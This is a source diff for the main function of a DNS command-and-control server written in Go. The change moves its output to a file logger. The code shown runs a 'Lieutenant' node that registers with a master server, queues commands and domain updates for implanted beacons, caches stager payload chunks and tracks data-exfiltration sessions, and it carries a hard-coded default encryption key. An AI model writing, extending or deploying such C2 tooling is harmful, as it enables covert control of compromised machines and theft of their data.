@@ -41,12 +41,15 @@ var (
 	gitCommit = "unknown"
 )
 
-// logf is a simple logging wrapper that respects debug mode
-// In debug mode, logs everything. Otherwise, only logs warnings/errors.
+// logf is a logging wrapper that logs to file and optionally stdout
+// Kept for backward compatibility with existing code using logf
 func logf(format string, args ...interface{}) {
-	// Log everything if debug mode is enabled, or if it's a warning/error
-	if debugMode || strings.Contains(format, "WARNING") || strings.Contains(format, "ERROR") || strings.Contains(format, "Failed") {
-		fmt.Printf(format+"\n", args...)
+	if strings.Contains(format, "ERROR") || strings.Contains(format, "Failed") {
+		LogError(format, args...)
+	} else if strings.Contains(format, "WARNING") || strings.Contains(format, "WARN") {
+		LogWarn(format, args...)
+	} else {
+		LogDebug(format, args...)
 	}
 }
 
@@ -699,6 +702,17 @@ func main() {
 	}
 	debugMode = cfg.Debug
 
+	// Initialize logger - logs to file in current directory, stdout if debug mode
+	if err := InitLogger("", cfg.Debug); err != nil {
+		fmt.Fprintf(os.Stderr, "Failed to initialize logger: %v\n", err)
+	}
+	defer CloseLogger()
+
+	LogInfo("DNS Server starting")
+	LogInfo("Domain: %s", cfg.Domain)
+	LogInfo("Bind address: %s:%d", cfg.BindAddr, cfg.BindPort)
+	LogInfo("Debug mode: %v", cfg.Debug)
+
 	// Initialize encrypted response cache
 	encryptedResponseCache = make(map[string]string)
 	responseCacheExpiry = make(map[string]time.Time)
@@ -719,16 +733,15 @@ func main() {
 				}
 			}
 			responseCacheMutex.Unlock()
-			if debugMode && expiredCount > 0 {
-				logf("[Cache] Cleaned up %d expired encrypted responses", expiredCount)
+			if expiredCount > 0 {
+				LogDebug("Cache: Cleaned up %d expired encrypted responses", expiredCount)
 			}
 		}
 	}()
 
 	// SECURITY: Warn if using default encryption key
 	if cfg.EncryptionKey == "MySecretC2Key123!@#DefaultChange" {
-		fmt.Println("WARNING: Using default encryption key! Change this in production!")
-		fmt.Println("Set encryption_key in config.json or via environment variable")
+		LogWarn("Using default encryption key! Change this in production!")
 	}
 
 	// Initialize C2Manager with database for persistence
@@ -740,6 +753,7 @@ func main() {
 	// Use "udp4" to force IPv4 only (avoid IPv6 binding issues)
 	pc, err := net.ListenPacket("udp4", bindAddr)
 	if err != nil {
+		LogError("Failed to listen on %s: %v", bindAddr, err)
 		panic(fmt.Sprintf("failed to listen on %s: %v", bindAddr, err))
 	}
 	defer pc.Close()
@@ -747,72 +761,58 @@ func main() {
 	// Initialize our authoritative zones
 	initializeZones(cfg)
 
-	// Note: Go 1.20+ automatically seeds the global random generator
-	// No need for explicit rand.Seed() call
-
 	// Log the actual local address we're bound to
 	localAddr := pc.LocalAddr()
 
-	// Display ASCII art banner
-	fmt.Println("\033[0;31m") // Red color
-	fmt.Println("  _    _       _           ___                    _____ ___  ")
-	fmt.Println(" | |  | |     | |         / _ \\                  / ____|__ \\ ")
-	fmt.Println(" | |  | |_ __ | | ___ __ | | | |_      ___ __   | |       ) |")
-	fmt.Println(" | |  | | '_ \\| |/ / '_ \\| | | \\ \\ /\\ / / '_ \\  | |      / / ")
-	fmt.Println(" | |__| | | | |   <| | | | |_| |\\ V  V /| | | | | |____ / /_ ")
-	fmt.Println("  \\____/|_| |_|_|\\_\\_| |_|\\___/  \\_/\\_/ |_| |_|  \\_____|____|")
-	fmt.Println("\033[0m") // Reset color
-	fmt.Println()
-
-	fmt.Printf("\033[0;32m==================================================\n")
-	fmt.Printf("DNS C2 Server v%s\n", version)
-	fmt.Printf("Build: %s (commit: %s)\n", buildDate, gitCommit)
-	fmt.Printf("==================================================\033[0m\n")
-	fmt.Printf("Authoritative DNS Server for: %s\n", cfg.Domain)
-	fmt.Printf("Listening on: %s (local: %s)\n", bindAddr, localAddr.String())
+	LogInfo("==================================================")
+	LogInfo("DNS C2 Server v%s", version)
+	LogInfo("Build: %s (commit: %s)", buildDate, gitCommit)
+	LogInfo("==================================================")
+	LogInfo("Authoritative DNS Server for: %s", cfg.Domain)
+	LogInfo("Listening on: %s (local: %s)", bindAddr, localAddr.String())
 
 	if cfg.ForwardDNS {
-		fmt.Printf("DNS Forwarding: Enabled (upstream: %s)\n", cfg.UpstreamDNS)
+		LogInfo("DNS Forwarding: Enabled (upstream: %s)", cfg.UpstreamDNS)
 	} else {
-		fmt.Printf("DNS Forwarding: Disabled (authoritative only)\n")
+		LogInfo("DNS Forwarding: Disabled (authoritative only)")
 	}
 
 	// Warn if binding to 0.0.0.0 (could cause interface issues)
 	if cfg.BindAddr == "0.0.0.0" {
-		fmt.Println("WARNING: Binding to 0.0.0.0 - responses may come from unexpected interface")
+		LogWarn("Binding to 0.0.0.0 - responses may come from unexpected interface")
 	}
 
 	// DISTRIBUTED MODE: Connect to Master Server
-	fmt.Printf("\n\033[0;36m==================================================\033[0m\n")
-	fmt.Printf("\033[0;36mMode: DISTRIBUTED (Lieutenant)\033[0m\n")
-	fmt.Printf("Master Server: %s\n", cfg.MasterServer)
-	fmt.Printf("Server ID: %s\n", cfg.MasterServerID)
-	fmt.Printf("\033[0;36m==================================================\033[0m\n\n")
+	LogInfo("==================================================")
+	LogInfo("Mode: DISTRIBUTED (Lieutenant)")
+	LogInfo("Master Server: %s", cfg.MasterServer)
+	LogInfo("Server ID: %s", cfg.MasterServerID)
+	LogInfo("==================================================")
 
 	// Initialize Master Client
 	masterClient = NewMasterClient(cfg.MasterServer, cfg.MasterServerID, cfg.MasterAPIKey, cfg.MasterTLSCACert, cfg.MasterTLSInsecure, debugMode)
 
 	// Register with Master and retrieve active domain list
-	fmt.Println("Registering with Master Server...")
+	LogInfo("Registering with Master Server...")
 	registrationAddr := strings.TrimSpace(cfg.SvrAddr)
 	if registrationAddr == "" {
 		registrationAddr = cfg.BindAddr
 	}
 	activeDomains, err := masterClient.RegisterWithMaster(cfg.Domain, registrationAddr)
 	if err != nil {
-		fmt.Printf("WARNING: Failed to register with Master Server: %v\n", err)
-		fmt.Println("Continuing with local configuration")
+		LogWarn("Failed to register with Master Server: %v", err)
+		LogInfo("Continuing with local configuration")
 	} else {
-		fmt.Printf("✓ Registered with Master - received %d active domains\n", len(activeDomains))
-		if debugMode && len(activeDomains) > 0 {
-			fmt.Printf("   Active domains: %v\n", activeDomains)
+		LogInfo("Registered with Master - received %d active domains", len(activeDomains))
+		if len(activeDomains) > 0 {
+			LogDebug("Active domains: %v", activeDomains)
 		}
 		// Store active domains in C2 manager for first check-in responses
 		c2Manager.SetKnownDomains(activeDomains)
 	}
 
 	// Perform initial check-in
-	fmt.Println("Connecting to Master Server...")
+	LogInfo("Connecting to Master Server...")
 	stats := map[string]interface{}{
 		"domain":       cfg.Domain,
 		"bind_addr":    cfg.BindAddr,
@@ -823,10 +823,10 @@ func main() {
 
 	_, _, _, err = masterClient.Checkin(stats)
 	if err != nil {
-		fmt.Printf("WARNING: Initial checkin to Master Server failed: %v\n", err)
-		fmt.Println("Continuing in resilient mode (will retry in background)")
+		LogWarn("Initial checkin to Master Server failed: %v", err)
+		LogInfo("Continuing in resilient mode (will retry in background)")
 	} else {
-		fmt.Println("✓ Connected to Master Server successfully")
+		LogInfo("Connected to Master Server successfully")
 	}
 
 	// Start periodic check-in (every 30 seconds)
@@ -842,23 +842,23 @@ func main() {
 	}, func(cacheTasks []StagerCacheTask) {
 		// Handle stager cache tasks pushed from Master
 		if len(cacheTasks) > 0 {
-			logf("[C2] Received %d stager cache task(s) from Master", len(cacheTasks))
+			LogDebug("Received %d stager cache task(s) from Master", len(cacheTasks))
 		}
 
 		for _, task := range cacheTasks {
-			logf("[C2] Processing cache: %s (%d chunks, %d bytes total)",
+			LogDebug("Processing cache: %s (%d chunks, %d bytes total)",
 				task.ClientBinaryID, task.TotalChunks, len(task.Chunks))
 
 			// Cache all chunks in local database
 			if c2Manager.db == nil {
-				logf("[C2] ERROR: Database is nil, cannot cache chunks!")
+				LogError("Database is nil, cannot cache chunks!")
 				continue
 			}
 
 			if err := c2Manager.db.CacheStagerChunks(task.ClientBinaryID, task.Chunks); err != nil {
-				logf("[C2] Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
+				LogError("Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
 			} else {
-				logf("[C2] Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
+				LogDebug("Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
 			}
 		}
 	}, func(domainUpdates []string) {
@@ -867,58 +867,45 @@ func main() {
 			return
 		}
 
-		logf("[C2] Received domain update from Master: %v", domainUpdates)
+		LogInfo("Received domain update from Master: %v", domainUpdates)
 
 		// Convert domain list to JSON
 		domainsJSON, err := json.Marshal(domainUpdates)
 		if err != nil {
-			logf("[C2] Failed to marshal domain list: %v", err)
+			LogError("Failed to marshal domain list: %v", err)
 			return
 		}
 
 		// Queue update_domains task for ALL active beacons
-		// CRITICAL: Domain updates are DNS-server-initiated, not Master tasks
-		// Use AddDomainUpdateTask to avoid conflicts with Master task IDs
 		beacons := c2Manager.GetBeacons()
 		taskCommand := fmt.Sprintf("update_domains:%s", string(domainsJSON))
 
 		activeCount := 0
 		for _, beacon := range beacons {
-			// AddDomainUpdateTask uses "D" prefix (D0001, D0002) instead of "T" to avoid conflicts
 			taskID := c2Manager.AddDomainUpdateTask(beacon.ID, taskCommand)
 			if taskID != "" {
-				logf("[C2] Queued domain update task %s for beacon %s", taskID, beacon.ID)
+				LogDebug("Queued domain update task %s for beacon %s", taskID, beacon.ID)
 				activeCount++
 			}
 		}
 
-		logf("[C2] Queued domain updates for %d beacon(s)", activeCount)
+		LogInfo("Queued domain updates for %d beacon(s)", activeCount)
 	}, func(completedExfil []string) {
 		// Handle completed exfil sessions from Master
 		if len(completedExfil) == 0 {
 			return
 		}
 
-		logf("[C2] Received %d completed exfil session(s) from Master", len(completedExfil))
+		LogDebug("Received %d completed exfil session(s) from Master", len(completedExfil))
 
 		for _, sessionID := range completedExfil {
-			// Find the session in C2Manager
-			// We need to access the map directly or add a getter
-			// Since we are in main package, we can access c2Manager.exfilSessions if it's exported?
-			// No, it's private. But we are in the same package 'main'.
-			// So we can access it.
-
 			c2Manager.mutex.Lock()
 			session, exists := c2Manager.exfilSessions[sessionID]
 			c2Manager.mutex.Unlock()
 
 			if exists {
-				// If it exists locally, mark it as completed
-				// This will update the UI/CLI status
-				// We use finalizeExfilSession which handles locking and persistence
-				// It also sends a completion notification to Master, which is redundant but harmless
 				if session.Status != "completed" {
-					logf("[C2] Marking exfil session %s as completed (synced from Master)", sessionID)
+					LogDebug("Marking exfil session %s as completed (synced from Master)", sessionID)
 					c2Manager.finalizeExfilSession(session)
 				}
 			}
@@ -928,36 +915,28 @@ func main() {
 	// Start periodic task polling (every 10 seconds)
 	masterClient.StartPeriodicTaskPoll(10*time.Second, func(tasks []TaskResponse) {
 		for _, task := range tasks {
-			// Queue task in C2Manager using the new AddTaskFromMaster function
-			// This tracks both local and master task IDs for proper result submission
 			c2Manager.AddTaskFromMaster(task.ID, task.BeaconID, task.Command)
-			if debugMode {
-				logf("[Distributed] Received task %s from master for beacon %s", task.ID, task.BeaconID)
-			}
+			LogDebug("Received task %s from master for beacon %s", task.ID, task.BeaconID)
 		}
 	})
 
 	// Start periodic beacon sync (every 30 seconds)
-	// This ensures all DNS servers know about beacons registered on other servers
 	masterClient.StartPeriodicBeaconSync(30*time.Second, func(beacons []BeaconData) {
 		for _, beaconData := range beacons {
-			// Sync beacon to local C2Manager
 			c2Manager.SyncBeaconFromMaster(beaconData)
 		}
-		if debugMode {
-			logf("[Distributed] Synced %d beacon(s) from master", len(beacons))
+		if len(beacons) > 0 {
+			LogDebug("Synced %d beacon(s) from master", len(beacons))
 		}
 	})
 
 	// Start periodic task status sync (every 5 seconds)
-	// This clears beacon.CurrentTask when Master completes task reassembly
 	masterClient.StartPeriodicTaskStatusSync(5*time.Second, func(tasks []TaskResponse) {
 		for _, task := range tasks {
-			// Update local task status and clear beacon.CurrentTask if needed
 			c2Manager.UpdateTaskStatusFromMaster(task.ID, task.Status)
 		}
-		if debugMode && len(tasks) > 0 {
-			logf("[Distributed] Synced %d task status update(s) from master", len(tasks))
+		if len(tasks) > 0 {
+			LogDebug("Synced %d task status update(s) from master", len(tasks))
 		}
 	})
 
@@ -971,28 +950,25 @@ func main() {
 
 	// Start DNS server in goroutine
 	go func() {
-		// Increase read buffer if needed for performance
 		_ = pc.SetReadDeadline(time.Time{})
 
-		buf := make([]byte, 512) // typical DNS UDP packet size
+		buf := make([]byte, 512)
 		for {
 			select {
 			case <-ctx.Done():
 				return
 			default:
-				// Set read timeout to allow checking ctx.Done periodically
 				pc.SetReadDeadline(time.Now().Add(1 * time.Second))
 
 				n, raddr, err := pc.ReadFrom(buf)
 				if err != nil {
-					// Check if it's a timeout, if so continue to check ctx
 					if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 						continue
 					}
 					if ctx.Err() != nil {
 						return
 					}
-					logf("read error: %v", err)
+					LogDebug("DNS read error: %v", err)
 					continue
 				}
 				pkt := make([]byte, n)
@@ -1003,19 +979,19 @@ func main() {
 					if msg, _, err := parseMessage(pkt); err == nil {
 						for _, q := range msg.Questions {
 							qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
-							logf("client=%s id=0x%04X q=%s type=%d class=%d",
+							LogDebug("client=%s id=0x%04X q=%s type=%d class=%d",
 								raddr.String(), msg.Header.ID, q.Name, q.Type, q.Class)
 
 							// Check if this looks like C2 traffic
 							if strings.Contains(qname, cfg.Domain) {
 								parts := strings.SplitN(qname, ".", 2)
 								if len(parts) > 0 && len(parts[0]) > 20 {
-									logf("Possible C2 traffic detected from %s", raddr.String())
+									LogDebug("Possible C2 traffic detected from %s", raddr.String())
 								}
 							}
 						}
 					} else {
-						logf("client=%s parse_error=%v", raddr.String(), err)
+						LogDebug("client=%s parse_error=%v", raddr.String(), err)
 					}
 				}
 
@@ -1028,28 +1004,26 @@ func main() {
 				resp, err := handleQuery(pkt, cfg, clientIP)
 
 				if err != nil {
-					logf("ERROR handling query: %v", err)
+					LogError("Error handling query: %v", err)
 					continue
 				}
 
 				if len(resp) == 0 {
-					if debugMode {
-						logf("WARNING: empty response generated")
-					}
+					LogDebug("Empty response generated")
 					continue
 				}
 
 				// Send the response back to the same address
 				bytesWritten, writeErr := pc.WriteTo(resp, raddr)
 				if writeErr != nil {
-					logf("ERROR writing response: %v", writeErr)
+					LogError("Error writing response: %v", writeErr)
 					continue
 				}
 
 				// Log only in debug mode
 				if debugMode {
 					if validateMsg, _, parseErr := parseMessage(resp); parseErr == nil {
-						logf("→ Sent %d bytes, ID=0x%04X, answers=%d to %s",
+						LogDebug("Sent %d bytes, ID=0x%04X, answers=%d to %s",
 							bytesWritten, validateMsg.Header.ID, validateMsg.Header.ANCount, raddr.String())
 					}
 				}
@@ -1059,7 +1033,7 @@ func main() {
 
 	// Wait for shutdown signal
 	<-shutdownChan
-	fmt.Println("\nShutting down DNS C2 Server...")
+	LogInfo("Shutting down DNS C2 Server...")
 
 	// Cancel context to stop DNS server
 	cancel()
@@ -1067,12 +1041,12 @@ func main() {
 	// Close database
 	if c2Manager != nil && c2Manager.db != nil {
 		if err := c2Manager.db.Close(); err != nil {
-			fmt.Printf("Warning: Error closing database: %v\n", err)
+			LogWarn("Error closing database: %v", err)
 		}
 	}
 
 	// Give goroutines time to finish
 	time.Sleep(500 * time.Millisecond)
 
-	fmt.Println("✓ DNS C2 Server stopped gracefully")
+	LogInfo("DNS C2 Server stopped gracefully")
 }
